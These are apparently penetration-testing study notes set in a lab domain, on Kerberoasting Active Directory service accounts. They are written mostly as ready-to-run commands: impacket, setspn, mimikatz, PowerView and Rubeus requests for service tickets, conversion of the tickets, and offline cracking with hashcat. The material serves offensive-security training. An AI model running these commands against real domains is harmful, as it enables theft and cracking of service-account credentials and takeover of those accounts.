## Kerberosting from Linux
## Kerberoasting with GetUserSPNs.py
Listing SPN Accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
Requesting all TGS Tickets
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
Requesting a Single TGS ticket
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
Saving the TGS Ticket to an Output File
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
Cracking the Ticket Offline with Hashcat
```
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

## Kerberoasting from Windows
### Manual method
#### Enumerating SPNs with setspn.exe
```
setspn.exe -Q */*
```
Targeting a single user. These tickets will be loaded into memory and can be extracted by using mimikatz.
```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
Retrieve all tickets using setspn.exe
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Extracting tickets from memory with Mimikatz
```
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
```
The base64 output can be taken and decoded to obtain the kirbi file. This kirbi file needs to be converted by using kirbi2john and hashcrack can be used to crack it.
```
echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
### Automated Tools - Powerview
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```
for specific user
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
exporting all tickets to a CSV file
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
### Rubeus
accounts with RC4 encryption are easy to crack
```
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
specific user
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
```
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
hashcat code for aes
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
/tgtdeleg flag can be used to downgrade encryption to RC4. Only works on server 2016 and older.


![image](https://github.com/Kript0r3x/CPTS/assets/65650002/e8cf8acc-d7b1-4e10-8b70-d0d5f8003528)

